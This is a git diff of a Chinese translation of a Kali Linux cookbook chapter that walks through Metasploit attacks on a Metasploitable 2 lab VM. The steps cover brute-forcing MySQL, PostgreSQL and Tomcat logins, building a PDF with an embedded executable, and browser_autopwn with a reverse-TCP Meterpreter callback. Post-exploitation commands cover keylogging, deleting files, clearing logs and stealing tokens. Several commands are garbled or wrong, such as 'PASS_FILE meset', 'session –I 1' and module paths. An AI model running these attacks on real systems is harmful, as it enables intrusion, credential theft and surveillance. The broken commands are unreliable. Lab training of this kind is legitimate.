@@ -22,43 +22,43 @@
 
 让我们开始下载 Metasploitable 2。最安全的选择是从 SourceForge 获取下载包：
 
-1.  从这个链接下载 Metasploitable 2：<http://sourceforge.net/ projects/metasploitable/files/Metasploitable2/>。
+1.从这个链接下载 Metasploitable 2：<http://sourceforge.net/ projects/metasploitable/files/Metasploitable2/>。
 
-2.  将文件包括到硬盘的某个位置。
+2.将文件包括到硬盘的某个位置。
 
-3.  解压文件。
+3.解压文件。
 
-4.  将文件夹内容放到你储存虚拟磁盘文件的位置。
+4.将文件夹内容放到你储存虚拟磁盘文件的位置。
 
-5.  打开 VirtualBox 并点击`New`按钮：
+5.打开 VirtualBox 并点击`New`按钮：
 
 ![](img/6-1-1.jpg)
 
-6.  点击`Next`。
+6.点击`Next`。
 
 ![](img/6-1-2.jpg)
 
-7.  输入 Metasploitable 2 的名称并将`Operating System: `选择为`Linux`，`Version: `选项`Ubuntu`。像下面的截图那样点击`Next`。
+7.输入 Metasploitable 2 的名称并将`Operating System: `选择为`Linux`，`Version: `选项`Ubuntu`。像下面的截图那样点击`Next`。
 
 ![](img/6-1-3.jpg)
 
-8.  如果可用的话，选择 `512 MB`，并点击`Next`。
+8.如果可用的话，选择 `512 MB`，并点击`Next`。
 
 ![](img/6-1-4.jpg)
 
-9.  选项现有磁盘，并从你下载和保存 Metasploitable 2 文件夹的地方选择 VDMK 文件。
+9.选项现有磁盘，并从你下载和保存 Metasploitable 2 文件夹的地方选择 VDMK 文件。
 
 ![](img/6-1-5.jpg)
 
-0.  你的虚拟磁盘窗口会像下面的截图那样。在这个示例中，我们完全不需要更新磁盘空间。这是因为使用 Metasploitable 的时候，你会攻击这个系统，而并不是将它用作操作系统。
+0.你的虚拟磁盘窗口会像下面的截图那样。在这个示例中，我们完全不需要更新磁盘空间。这是因为使用 Metasploitable 的时候，你会攻击这个系统，而并不是将它用作操作系统。
 
 ![](img/6-1-6.jpg)
 
-1.  点击`Create`。
+1.点击`Create`。
 
 ![](img/6-1-7.jpg)
 
-2.  通过点击 Metasploitable 2 的名称和`Start`按钮来启动它。
+2.通过点击 Metasploitable 2 的名称和`Start`按钮来启动它。
 
 #### 工作原理
 
@@ -76,19 +76,19 @@
 
 让我们开始操作 Armitage：
 
-1.  从桌面上访问`Start | Kali Linux | Exploitation Tools | Network Exploitation Tools | Armitage`。
+1.从桌面上访问`Start | Kali Linux | Exploitation Tools | Network Exploitation Tools | Armitage`。
 
 ![](img/6-2-1.jpg)
 
-2.  在 Armitage的登录界面中，点击`Connect`（连接）按钮。
+2.在 Armitage的登录界面中，点击`Connect`（连接）按钮。
 
 ![](img/6-2-2.jpg)
 
-3.  Armitage 可能需要一些时间来连接 Metasploit。当它完成时，你可能看见下面的提示窗口。不要惊慌，一旦 Armitage 能够连接时，它会消失的。在` Start Metaspoit?`界面，点击`Yes`：
+3.Armitage 可能需要一些时间来连接 Metasploit。当它完成时，你可能看见下面的提示窗口。不要惊慌，一旦 Armitage 能够连接时，它会消失的。在` Start Metaspoit?`界面，点击`Yes`：
 
 ![](img/6-2-3.jpg)
 
-4.  随后你会看到 Armitage 的主窗口。我们现在讨论主窗口的三个区域（标记为`A`、`B`和`C`，在下面的截图中）。
+4.随后你会看到 Armitage 的主窗口。我们现在讨论主窗口的三个区域（标记为`A`、`B`和`C`，在下面的截图中）。
 
 +   `A`：这个区域展示了预先配置的模块。你可以通过模块列表下面的搜索框来搜索。
 
@@ -136,15 +136,15 @@
 
 让我们开始探索  MSFCONSOLE：
 
-1.  打开命令行。
+1.打开命令行。
 
-2.  通过下列命令启动 MSFCONSOLE：
+2.通过下列命令启动 MSFCONSOLE：
 
 ```
 msfconsole
 ```
 
-3.  通过`search`命令搜索所有可用的 Linux 模块。每次我们打算执行操作时，都搜索一遍模块通常是个好主意。主要因为在 Metasploit 的不同版本之间，模块路径可能发生改变。
+3.通过`search`命令搜索所有可用的 Linux 模块。每次我们打算执行操作时，都搜索一遍模块通常是个好主意。主要因为在 Metasploit 的不同版本之间，模块路径可能发生改变。
 
 ```
 search linux
@@ -152,7 +152,7 @@ search linux
 
 ![](img/6-3-1.jpg)
 
-4.  使用 John the Ripper Linux 密码破解模块。
+4.使用 John the Ripper Linux 密码破解模块。
 
 ```
 use auxiliary/analyzse/jtr_linux
@@ -160,7 +160,7 @@ use auxiliary/analyzse/jtr_linux
 
 ![](img/6-3-2.jpg)
 
-5.  通过下列命令展示该模块的可用选项。
+5.通过下列命令展示该模块的可用选项。
 
 ```
 show options
@@ -168,13 +168,13 @@ show options
 
 ![](img/6-3-3.jpg)
 
-6.  既然我们列出了可以对这个模块使用的选项，我们可以使用`set`命令来设置独立选项。让我们设置`JOHN_PATH`选项：
+6.既然我们列出了可以对这个模块使用的选项，我们可以使用`set`命令来设置独立选项。让我们设置`JOHN_PATH`选项：
 
 ```
 set JOHN_PATH /usr/share/metasploit-framework/data/john/wordlists/ password.lst
 ```
 
-7.  现在执行漏洞利用，我们需要输入`exploit`命令：
+7.现在执行漏洞利用，我们需要输入`exploit`命令：
 
 ```
 exploit
@@ -206,7 +206,7 @@ MSFCLI 的一些命令是：
 
 让我们开始探索  MSFCLI：
 
-1.  使用下列命令启动 Metasploit CLI （MSFCLI）。请耐心等待，因为这可能花一些时间，取决于你的系统速度。同时注意当 MSFCLI 加载完成时，会显示可用的漏洞利用列表。
+1.使用下列命令启动 Metasploit CLI （MSFCLI）。请耐心等待，因为这可能花一些时间，取决于你的系统速度。同时注意当 MSFCLI 加载完成时，会显示可用的漏洞利用列表。
 
 ```
 msfcli
@@ -214,7 +214,7 @@ msfcli
 
 ![](img/6-4-1.jpg)
 
-2.  显示 MSFCLI 帮助文档：
+2.显示 MSFCLI 帮助文档：
 
 ```
 msfcli -h
@@ -222,7 +222,7 @@ msfcli -h
 
 ![](img/6-4-2.jpg)
 
-3.  出于我们的演示目的，我们会执行圣诞树扫描（ Christmas Tree Scan）。我们会选择选项 A 来显示模块高级选项。
+3.出于我们的演示目的，我们会执行圣诞树扫描（ Christmas Tree Scan）。我们会选择选项 A 来显示模块高级选项。
 
 ```
 msfcli auxiliary/scanner/portscan/xmas A
@@ -232,7 +232,7 @@ msfcli auxiliary/scanner/portscan/xmas A
 
 ![](img/6-4-3.jpg)
 
-4.  此外，你可以列出当前模块的概览，通过使用`S`模式。概览模式是一个极好方式，来查看可用于当前尝试执行的漏洞利用的所有选项。许多选项都是可选的，但是一小部分通常是必须的，它们允许你设置尝试利用哪个目标或端口的漏洞。
+4.此外，你可以列出当前模块的概览，通过使用`S`模式。概览模式是一个极好方式，来查看可用于当前尝试执行的漏洞利用的所有选项。许多选项都是可选的，但是一小部分通常是必须的，它们允许你设置尝试利用哪个目标或端口的漏洞。
 
 ```
 msfcli auxiliary/scanner/portscan/xmas S
@@ -240,7 +240,7 @@ msfcli auxiliary/scanner/portscan/xmas S
 
 ![](img/6-4-4.jpg)
 
-5.  为了展示可用于此次漏洞利用的选项列表，我们使用`O`模式。选项使用中配置漏洞利用模块的方式。每个利用模块都用不同的选项集合（或者什么都没有）。任何所需的选项必须在漏洞利用执行之前设置。在下面的截图中，你会注意到许多所需选项都设为默认。如果你碰到了这种情况，你就不需要更新选项的值，除非你打算修改它。
+5.为了展示可用于此次漏洞利用的选项列表，我们使用`O`模式。选项使用中配置漏洞利用模块的方式。每个利用模块都用不同的选项集合（或者什么都没有）。任何所需的选项必须在漏洞利用执行之前设置。在下面的截图中，你会注意到许多所需选项都设为默认。如果你碰到了这种情况，你就不需要更新选项的值，除非你打算修改它。
 
 ```
 msfcli auxiliary/scanner/portscan/xmas O
@@ -248,7 +248,7 @@ msfcli auxiliary/scanner/portscan/xmas O
 
 ![](img/6-4-5.jpg)
 
-6.  我们使用`E`模式来执行漏洞利用。
+6.我们使用`E`模式来执行漏洞利用。
 
 ```
 msfcli auxiliary/scanner/portscan/xmas E
@@ -302,51 +302,51 @@ msfcli auxiliary/scanner/portscan/xmas E
 
 让我们打开 MSFCONSOLE 来开始：
 
-1.  首先我们以 MSFCONSOLE 中展示的活动会话开始。
+1.首先我们以 MSFCONSOLE 中展示的活动会话开始。
 
-2.  开始记录目标系统中用户的击键顺序：
+2.开始记录目标系统中用户的击键顺序：
 
 ```
 keyscan_start 
 ```
 
-3.  转储目标系统中用户的击键顺序。击键顺序会显示在屏幕上：
+3.转储目标系统中用户的击键顺序。击键顺序会显示在屏幕上：
 
 ```
 keyscan_dump 
 ```
 
-4.  停止记录目标系统中用户的击键顺序。
+4.停止记录目标系统中用户的击键顺序。
 
 ```
 keyscan_stop 
 ```
 
-5.  删除目标系统中的文件。
+5.删除目标系统中的文件。
 
 ```
 del exploited.docx 
 ```
 
-6.  清除目标系统中的事件日志。
+6.清除目标系统中的事件日志。
 
 ```
 clearav 
 ```
 
-7.  展示运行进程的列表。
+7.展示运行进程的列表。
 
 ```
 ps
 ```
 
-8.  杀掉受害者系统的指定进程，使用`kill [pid]`语法。
+8.杀掉受害者系统的指定进程，使用`kill [pid]`语法。
 
 ```
 kill 6353
 ```
 
-9.  尝试偷取目标系统上的模拟令牌。
+9.尝试偷取目标系统上的模拟令牌。
 
 ```
 steal_token 
@@ -378,15 +378,15 @@ steal_token
 
 让我们通过打开终端窗口来开始  MySQL 攻击：
 
-1.  打开终端窗口。
+1.打开终端窗口。
 
-2.  启动 MSFCONSOLE。
+2.启动 MSFCONSOLE。
 
 ```
 msfconsole 
 ```
 
-3.  搜索可用的 MySQL 模块。
+3.搜索可用的 MySQL 模块。
 
 ```
 msfconsole mysql
@@ -394,7 +394,7 @@ msfconsole mysql
 
 ![](img/6-6-1.jpg)
 
-4.  使用 MySQL 扫描器模块。
+4.使用 MySQL 扫描器模块。
 
 ```
 use auxiliary/scanner/mysql/mysql_login
@@ -402,7 +402,7 @@ use auxiliary/scanner/mysql/mysql_login
 
 ![](img/6-6-2.jpg)
 
-5.  显示模块的可用选项。
+5.显示模块的可用选项。
 
 ```
 show options
@@ -410,25 +410,25 @@ show options
 
 ![](img/6-6-3.jpg)
 
-6.  将 RHOST 设置为 Metasploitable 2 主机或目标主机的地址。
+6.将 RHOST 设置为 Metasploitable 2 主机或目标主机的地址。
 
 ```
 set RHOST 192.168.10.111 
 ```
 
-7.  设置用户名文件的位置。你可以选择：
+7.设置用户名文件的位置。你可以选择：
 
 ```
 set user_file /root/Desktop/usernames.txt
 ```
 
-8.  设置密码文件的位置。你可以选择：
+8.设置密码文件的位置。你可以选择：
 
 ```
 set pass_file /root/Desktop/passwords.txt
 ```
 
-9.  执行漏洞利用：
+9.执行漏洞利用：
 
 ```
 Exploit
@@ -436,7 +436,7 @@ Exploit
 
 ![](img/6-6-4.jpg)
 
-0.  Metasploit 会尝试输入包含在两个文件中的所有用户名和密码组合。找到生效的登录和密码组合旁边的`+`符号就可以了。
+0.Metasploit 会尝试输入包含在两个文件中的所有用户名和密码组合。找到生效的登录和密码组合旁边的`+`符号就可以了。
 
 #### 工作原理
 
@@ -464,15 +464,15 @@ Exploit
 
 让我们通过打开终端窗口来开始 PostgreSQL 攻击：
 
-1.  打开终端窗口。
+1.打开终端窗口。
 
-2.  启动 MSFCONSOLE。
+2.启动 MSFCONSOLE。
 
 ```
 msfconsole 
 ```
 
-3.  搜索可用的 PostgreSQL 模块。
+3.搜索可用的 PostgreSQL 模块。
 
 ```
 msfconsole postgresql
@@ -480,7 +480,7 @@ msfconsole postgresql
 
 ![](img/6-7-1.jpg)
 
-4.  使用 PostgreSQL 扫描器模块。
+4.使用 PostgreSQL 扫描器模块。
 
 ```
 use auxiliary/scanner/mysql/postgres_login
@@ -488,37 +488,37 @@ use auxiliary/scanner/mysql/postgres_login
 
 ![](img/6-7-2.jpg)
 
-5.  显示模块的可用选项。
+5.显示模块的可用选项。
 
 ```
 show options
 ```
 
-6.  将 RHOST 设置为 Metasploitable 2 主机或目标主机的地址。
+6.将 RHOST 设置为 Metasploitable 2 主机或目标主机的地址。
 
 ```
 set RHOST 192.168.10.111 
 ```
 
-7.  设置用户名文件的位置。你可以选择：
+7.设置用户名文件的位置。你可以选择：
 
 ```
 set user_file /root/Desktop/usernames.txt
 ```
 
-8.  设置密码文件的位置。你可以选择：
+8.设置密码文件的位置。你可以选择：
 
 ```
 set pass_file /root/Desktop/passwords.txt
 ```
 
-9.  执行漏洞利用：
+9.执行漏洞利用：
 
 ```
 Exploit
 ```
 
-0.  Metasploit 会尝试输入包含在两个文件中的所有用户名和密码组合。找到生效的登录和密码组合旁边的`+`符号就可以了。
+0.Metasploit 会尝试输入包含在两个文件中的所有用户名和密码组合。找到生效的登录和密码组合旁边的`+`符号就可以了。
 
 #### 工作原理
 
@@ -546,15 +546,15 @@ Exploit
 
 让我们通过打开终端窗口来开始这个秘籍：
 
-1.  打开终端窗口。
+1.打开终端窗口。
 
-2.  启动 MSFCONSOLE。
+2.启动 MSFCONSOLE。
 
 ```
 msfconsole 
 ```
 
-3.  搜索可用的 Tomcat 模块。
+3.搜索可用的 Tomcat 模块。
 
 ```
 msfconsole tomcat
@@ -562,13 +562,13 @@ msfconsole tomcat
 
 ![](img/6-8-1.jpg)
 
-4.  使用 Tomcat Application Manager Login Utility。
+4.使用 Tomcat Application Manager Login Utility。
 
 ```
 use auxiliary/scanner/http/tomcat_mgr_login 
 ```
 
-5.  显示模块的可用选项。
+5.显示模块的可用选项。
 
 ```
 show options
@@ -576,31 +576,31 @@ show options
 
 > 要注意我们有很多设置为“是”的项目，它们都是必须的。我们使用它们的默认值。
 
-6.  设置`Pass_File`：
+6.设置`Pass_File`：
 
 ```
 PASS_FILE meset /usr/share/metasploit-framework/data/wordlists/ tomcat_mgr_default_pass.txt
 ```
 
-7.  设置`Pass_File`：
+7.设置`Pass_File`：
 
 ```
 USER_FILE mset /usr/share/metasploit-framework/data/wordlists/ tomcat_mgr_default_pass.txt
 ```
 
-8.  设置目标的`RHOST`，这里我们选择我们的 Metasploitable 2 主机：
+8.设置目标的`RHOST`，这里我们选择我们的 Metasploitable 2 主机：
 
 ```
 set RHOSTS 192.168.10.111
 ```
 
-9.  将`RPORT`设置为 8180：
+9.将`RPORT`设置为 8180：
 
 ```
 set RPORT 8180
 ```
 
-0.  执行漏洞利用：
+0.执行漏洞利用：
 
 ```
 Exploit
@@ -628,15 +628,15 @@ Exploit
 
 让我们通过打开终端窗口来开始这个秘籍：
 
-1.  打开终端窗口。
+1.打开终端窗口。
 
-2.  启动 MSFCONSOLE。
+2.启动 MSFCONSOLE。
 
 ```
 msfconsole 
 ```
 
-3.  搜索可用的 PDF 模块。
+3.搜索可用的 PDF 模块。
 
 ```
 msfconsole pdf
@@ -644,13 +644,13 @@ msfconsole pdf
 
 ![](img/6-9-1.jpg)
 
-4.  使用 PDF 内嵌模块：
+4.使用 PDF 内嵌模块：
 
 ```
 use exploit/windows/fileformat/adobe_pdf_embedded_exe 
 ```
 
-5.  显示模块的可用选项。
+5.显示模块的可用选项。
 
 ```
 show options
@@ -658,13 +658,13 @@ show options
 
 ![](img/6-9-2.jpg)
 
-6.  设置我们想要生成的 PDF 文件名称：
+6.设置我们想要生成的 PDF 文件名称：
 
 ```
 set FILENAME evildocument.pdf
 ```
 
-7.  设置 INFILENAME 选项。它是你打算使用的 PDF 文件的位置。这里，我使用桌面上的简历。
+7.设置 INFILENAME 选项。它是你打算使用的 PDF 文件的位置。这里，我使用桌面上的简历。
 
 ```
 set INFILENAME /root/Desktop/willie.pdf
@@ -672,7 +672,7 @@ set INFILENAME /root/Desktop/willie.pdf
 
 > 要注意，这个模块的所有选项都是可选的，除了`INFILENAME `。
 
-8.  执行漏洞利用：
+8.执行漏洞利用：
 
 ```
 Exploit
@@ -696,15 +696,15 @@ Exploit
 
 让我们通过打开终端窗口来开始这个秘籍：
 
-1.  打开终端窗口。
+1.打开终端窗口。
 
-2.  启动 MSFCONSOLE：
+2.启动 MSFCONSOLE：
 
 ```
 msfconsole 
 ```
 
-3.  搜索可用的 `autopwn` 模块。
+3.搜索可用的 `autopwn` 模块。
 
 ```
 msfconsole autopwn
@@ -712,63 +712,63 @@ msfconsole autopwn
 
 ![](img/6-10-1.jpg)
 
-4.  使用` browser_autopwn `模块：
+4.使用` browser_autopwn `模块：
 
 ```
 Use auxiliary/server/browser_autopwn
 ```
 
-5.  设置我们的载荷，这里我们使用 Windows 反向 TCP：
+5.设置我们的载荷，这里我们使用 Windows 反向 TCP：
 
 ```
 set payload windows/meterpreter/reverse_tcp 
 ```
 
-6.  显示可用于该载荷类型的选项。
+6.显示可用于该载荷类型的选项。
 
 ```
 show options
 ```
 
-7.  设置反向连接所使用的 IP。这里，该 PC 的 IP 地址为` 192.168.10.109`。
+7.设置反向连接所使用的 IP。这里，该 PC 的 IP 地址为` 192.168.10.109`。
 
 ```
 set LHOST 192.168.10.109
 ```
 
-8.  下面，我们打算设置 URIPATH，这里我们使用`"filetypes"`（带引号）：
+8.下面，我们打算设置 URIPATH，这里我们使用`"filetypes"`（带引号）：
 
 ```
 set URIPATH "filetypes" 
 ```
 
-9.  最后，我们执行漏洞利用：
+9.最后，我们执行漏洞利用：
 
 ```
 exploit
 ```
 
-0.  Metasploit 会在 IP 地址 <http://[Provided IP Address]:8080> 处执行漏洞利用。
+0.Metasploit 会在 IP 地址 <http://[Provided IP Address]:8080> 处执行漏洞利用。
 
-1.  当访问者访问这个地址时，`browser_autopwn`模块尝试连接用户的机器来建立远程会话。如果成功的话，Meterpreter 会确认这个会话。使用会话命令来激活它：
+1.当访问者访问这个地址时，`browser_autopwn`模块尝试连接用户的机器来建立远程会话。如果成功的话，Meterpreter 会确认这个会话。使用会话命令来激活它：
 
 ```
 session –I 1
 ```
 
-2.  为了显示我们可以使用的 Meterpreter 命令列表，输入`help`。
+2.为了显示我们可以使用的 Meterpreter 命令列表，输入`help`。
 
 ```
 help
 ```
 
-3.  会显示可用命令的列表。这里，我们启动击键顺序扫描：
+3.会显示可用命令的列表。这里，我们启动击键顺序扫描：
 
 ```
 keyscan_start 
 ```
 
-4.  为了得到受害者机器上的击键顺序，我们键入`keyscan_start`命令：
+4.为了得到受害者机器上的击键顺序，我们键入`keyscan_start`命令：
 
 ```
 keyscan_dump
